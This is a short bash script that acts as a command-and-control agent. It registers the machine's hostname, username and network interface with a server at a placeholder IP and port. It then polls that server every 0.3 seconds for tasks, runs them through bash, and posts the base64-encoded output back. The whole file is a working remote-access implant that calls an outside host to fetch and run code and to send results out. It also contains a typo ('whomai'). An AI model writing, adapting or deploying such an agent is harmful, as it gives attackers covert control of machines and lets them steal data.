#!/bin/bash
ip="REPLACE_IP"
port="REPLACE_PORT"
interface="REPLACE_INTERFACE"
n=.3

regl="http://$ip:$port/reg/"

declare -A data=( [eth]=$interface [hname]=$(hostname) )

name=$(curl -X POST -F eth=$interface -F hname=$(hostname) -F username=$(whoami) $regl) 

taskl="http://$ip:$port/tasks/$name/"
resultl="http://$ip:$port/Lin-results/$name/"

userfile=$(whomai)
while :
do  
    curl $taskl > /tmp/tasks-$userfile 
    if [ -s /tmp/tasks-$userfile ]; then
        cat /tmp/tasks-$userfile | bash > /tmp/results-$userfile
        base64 /tmp/results-$userfile > /tmp/enc-result-$userfile  
        curl -X POST --data "@/tmp/enc-result-$userfile" $resultl
    fi
    sleep $n    
done

